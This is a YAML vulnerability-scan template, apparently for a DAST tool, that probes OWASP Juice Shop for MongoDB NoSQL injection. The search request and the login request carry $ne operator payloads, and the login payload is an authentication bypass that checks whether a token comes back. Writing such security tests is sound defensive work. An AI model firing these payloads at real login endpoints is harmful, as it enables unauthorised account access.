id: juice-shop-nosql-injection
info:
  name: NoSQL Injection - MongoDB Operators
  author: dast-mvp
  owasp_category: A05:2025
  severity: critical
  description: Tests for NoSQL injection vulnerabilities using MongoDB operators
  tags:
    - juice-shop
    - nosql
    - injection

requests:
  - path: /rest/products/search?q={"$ne":""}
    method: GET
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"status":"success"'
          - name
          - price
        condition: and

  - path: /rest/user/login
    method: POST
    headers:
      Content-Type: application/json
    body: '{"email":{"$ne":""},"password":{"$ne":""}}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
          - 401
        negative: false
      - type: word
        words:
          - authentication
          - token
        condition: or

  - path: /rest/products/reviews
    method: GET
    matchers:
      - type: status
        status:
          - 200
